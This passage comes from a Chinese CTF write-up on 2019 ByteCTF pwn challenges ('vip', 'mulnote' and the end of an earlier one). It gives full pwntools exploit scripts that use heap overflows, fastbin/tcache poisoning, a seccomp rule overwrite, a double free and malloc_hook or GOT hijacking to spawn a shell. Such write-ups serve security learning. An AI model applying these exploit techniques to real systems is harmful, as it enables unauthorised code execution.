number">0xe0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0xe0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#get target chunk,fastbin attack success</span><span class="token comment" spellcheck="true"># control stdout</span>fake_stdout <span class="token operator">=</span> <span class="token string">"0"</span>fake_stdout<span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x40</span>fake_stdout<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span>fake_stdout<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>fake_stdout<span class="token operator">+=</span> p16<span class="token punctuation">(</span>stdout_addr_last4<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># io_write_base指向自己，才能把地址打印出来</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>fake_stdout<span class="token punctuation">)</span>stdout_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token keyword">print</span> <span class="token string">"stdout address: "</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>stdout_addr<span class="token punctuation">)</span>libc_offset <span class="token operator">=</span> stdout_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true"># hajacking malloc_hook</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>target_start_addr <span class="token operator">=</span> libc_offset <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">-</span><span class="token number">0x1a1</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>target_start_addr<span class="token punctuation">)</span>payload3 <span class="token operator">=</span> payload<span class="token operator">+</span>p64<span class="token punctuation">(</span>target_start_addr<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload3<span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0xe0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0xe0</span><span class="token punctuation">)</span>payload4 <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0xd9</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>payload4<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>target_start_addr<span class="token operator">+=</span> <span class="token number">0xe1</span>payload4 <span class="token operator">=</span> payload<span class="token operator">+</span>p64<span class="token punctuation">(</span>target_start_addr<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload4<span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0xe0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0xe0</span><span class="token punctuation">)</span>one_gadgets<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x45216</span><span class="token punctuation">,</span><span class="token number">0x4526a</span><span class="token punctuation">,</span><span class="token number">0xf02a4</span><span class="token punctuation">,</span><span class="token number">0xf1147</span><span class="token punctuation">]</span>hijacking_malloc_addr <span class="token operator">=</span> target_start_addr<span class="token operator">+</span><span class="token number">0x10</span>payload5 <span class="token operator">=</span> p64<span class="token punctuation">(</span>libc_offset <span class="token operator">+</span> one_gadgets<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload5<span class="token operator">+=</span> <span class="token number">0xa0</span><span class="token operator">*</span><span class="token string">"a"</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_offset <span class="token operator">+</span> one_gadgets<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_offset<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'realloc'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># one_gadget放在realloc_hook地址，malloc_hook的地址放realloc函数</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>payload5<span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>这里最后需要解释一下，为什么one_gadget没有放到malloc_hook之中，原因是环境问题导致one_gadget无法正常使用，所以我们利用realloc平衡栈帧。具体操作是，one_gadget放在realloc_hook中，malloc_hook存放realloc函数地址</strong></p><h1 id="vip"><a href="#vip" class="headerlink" title="vip"></a>vip</h1><h2 id="0x01-查看文件-2"><a href="#0x01-查看文件-2" class="headerlink" title="0x01 查看文件"></a>0x01 查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/22.png"></div>第一反应就是hijacking GOT，没有开PIE相对更好利用。## 0x02 IDA分析删除功能<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/23.png"></div>没有UAF。创建功能<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/24.png"></div>就只有创建0x50的功能编辑功能<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/25.png"></div>这里有溢出漏洞，没有检查长度直接写入查看功能<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/26.png"></div>貌似也没什么漏洞vip功能<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/27.png"></div>里面的ptrl函数是禁止某些权限，而第三个参数&amp;v1就是所定义的规则，与此同时前面有一个溢出的漏洞：<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/28.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/29.png"></div>仅有0x20的空间却读入了0x50的长度，但是buf下面就是定义的规则。所以我们需要修改这些规则，来达到绕过的目的。## 0x03 思路**思路一：绕过规则使程序可以劫持GOT表到system函数达到shellcode的目的（那个规则不知道怎么获得)**<p> 步骤一：先溢出修改绕过规则</p><pre><code>rule = "\x20\x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x03\x01\x01\x00\x00\x20\x00\x00\x00\x18\x00\x00\x00\x15\x00\x00\x01\x7e\x20\x40\x00\x06\x00\x00\x00\x00\x00\x05\x00\x06\x00\x00\x00\x00\x00\xff\x7f"vip("a"*0x20+rule)</code></pre><p>步骤二：hijacking free_hook或者free got都可以<br>思路一：利用tcache机制</p><h2 id="0x04-exp-1"><a href="#0x04-exp-1" class="headerlink" title="0x04 exp"></a>0x04 exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./vip"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./vip'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.27.so'</span><span class="token punctuation">)</span>sendafter <span class="token operator">=</span> p<span class="token punctuation">.</span>sendaftersendlineafter <span class="token operator">=</span> p<span class="token punctuation">.</span>sendlineafter<span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    sendlineafter<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>    sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    sendlineafter<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>    sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    sendlineafter<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>    sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> size<span class="token punctuation">,</span> cont<span class="token punctuation">)</span><span class="token punctuation">:</span>    sendlineafter<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">)</span>    sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    sendafter<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span> cont<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">vip</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    sendlineafter<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">)</span>    sendafter<span class="token punctuation">(</span><span class="token string">'name: '</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>rule <span class="token operator">=</span> <span class="token string">"\x20\x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x03\x01\x01\x00\x00\x20\x00\x00\x00\x18\x00\x00\x00\x15\x00\x00\x01\x7e\x20\x40\x00\x06\x00\x00\x00\x00\x00\x05\x00\x06\x00\x00\x00\x00\x00\xff\x7f"</span>vip<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>rule<span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token number">0x50</span><span class="token operator">*</span><span class="token string">"a"</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x61</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x404100</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0xf</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0xf</span><span class="token punctuation">,</span><span class="token number">0x8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>data <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>offset <span class="token operator">=</span> data <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span>free_hook <span class="token operator">=</span> offset <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>system <span class="token operator">=</span> offset <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>binsh <span class="token operator">=</span> offset <span class="token operator">+</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0xf</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>思路二：unlink<br>不能使用unlink，因为创建不出大于fastbin的chunk。(可以触发unlink只是不知道能不能getshell 20.5.22)</p><h1 id="mulnote"><a href="#mulnote" class="headerlink" title="mulnote"></a>mulnote</h1><h2 id="0x01-查看文件-3"><a href="#0x01-查看文件-3" class="headerlink" title="0x01 查看文件"></a>0x01 查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/30.png"></div>无法hijacking got，所以我们就可以利用malloc和free的hook来控制程序流<h2 id="0x02-IDA分析"><a href="#0x02-IDA分析" class="headerlink" title="0x02 IDA分析"></a>0x02 IDA分析</h2><p>IDA里面代码非常乱，但是我们需要知道一些重要的东西，最重要的无非就是delete和malloc以及edit</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/31.png"></div>在delete中我们有短暂的UAF漏洞以及Double free别的地方没有看到有漏洞。注意：由于PIE开启程序加载地址不固定，所以就无法进行 unlink直接控制指针。<h2 id="0x03-思路"><a href="#0x03-思路" class="headerlink" title="0x03 思路"></a>0x03 思路</h2><p>1.但是我们看到有show函数，所以我们可以利用unsorted bin的特性以及 UAF来进行泄露main arean，并且算出libc基址。<br>2.进行Double free攻击，malloc一个可以控制malloc_hook指针的chunk。<br>3.找到shellcode的地址进行控制。</p><h2 id="0x04-调试"><a href="#0x04-调试" class="headerlink" title="0x04 调试"></a>0x04 调试</h2><p>1.泄露libc基址：</p><pre class="line-numbers language-python"><code class="language-python">create<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token string">"0"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"note[0]:\n"</span><span class="token punctuation">)</span>data <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> data <span class="token operator">-</span> offset_arean_libc <span class="token operator">-</span> <span class="token number">88</span><span class="token keyword">print</span> libc_base<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2.Double free并且找到一个可以控制malloc_hook的chunk</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/32.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/33.png"></div>也就是malloc_hook的地址-0x13。这里hook的地址有两种方法算出来：1.libc_base + libc.symbols["_malloc_hook"]2.根据之前偏移算出来<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># malloc_hook = libc_base + libc.symbols['__malloc_hook']</span>malloc_hook  <span class="token operator">=</span> data <span class="token operator">-</span> <span class="token number">0x68</span>create<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>malloc_hook<span class="token number">-0x13</span><span class="token punctuation">)</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">"c"</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span>shellcode_offset<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3.找到shellcode地址</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/33.png"></div>shellcode_addr =  libcbase+0x4526a<h2 id="0x05-exp"><a href="#0x05-exp" class="headerlink" title="0x05 exp"></a>0x05 exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./mulnote"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># p = remote("112.126.101.96",9999)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>sz<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">"C"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">"E"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">"R"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">"S"</span><span class="token punctuation">)</span>offset_arean_libc <span class="token operator">=</span>  <span class="token number">0x3c4b20</span>shellcode_offset <span class="token operator">=</span> <span class="token number">0x4526a</span>create<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token string">"0"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"note[0]:\n"</span><span class="token punctuation">)</span>data <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> data <span class="token operator">-</span> offset_arean_libc <span class="token operator">-</span> <span class="token number">88</span><span class="token keyword">print</span> libc_base<span class="token comment" spellcheck="true"># malloc_hook = libc_base + libc.symbols['__malloc_hook']</span>malloc_hook  <span class="token operator">=</span> data <span class="token operator">-</span> <span class="token number">0x68</span>create<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>malloc_hook<span class="token number">-0x13</span><span class="token punctuation">)</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">"c"</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span>shellcode_offset<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            